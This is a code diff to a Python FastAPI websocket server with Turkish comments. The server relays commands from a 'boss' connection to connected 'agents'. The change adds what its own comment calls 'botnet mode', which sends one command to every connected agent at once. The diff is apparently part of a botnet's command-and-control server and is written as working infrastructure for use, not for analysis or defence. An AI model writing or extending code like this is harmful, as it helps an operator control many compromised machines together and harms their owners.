@@ -62,6 +62,8 @@ async def websocket_endpoint_agent(websocket: WebSocket, agent_id: str):
     except WebSocketDisconnect:
         manager.disconnect_agent(agent_id)
 
+# --- SUNUCU TARAFINDAKİ DEĞİŞİKLİK ---
+
 @app.websocket("/ws/boss")
 async def websocket_endpoint_boss(websocket: WebSocket):
     await manager.connect_boss(websocket)
@@ -70,7 +72,17 @@ async def websocket_endpoint_boss(websocket: WebSocket):
             data = await websocket.receive_text()
             command_data = json.loads(data)
             target = command_data.get("target_id")
-            if target:
+            
+            # EĞER HEDEF "ALL" İSE HERKESE GÖNDER (BOTNET MODU)
+            if target == "ALL":
+                # Sözlük değişirken hata almamak için listeye çevirip dönüyoruz
+                active_ids = list(manager.active_agents.keys())
+                for agent_id in active_ids:
+                    await manager.send_command_to_agent(agent_id, command_data)
+            
+            # TEKİL HEDEF
+            elif target:
                 await manager.send_command_to_agent(target, command_data)
+                
     except WebSocketDisconnect:
         manager.disconnect_boss()
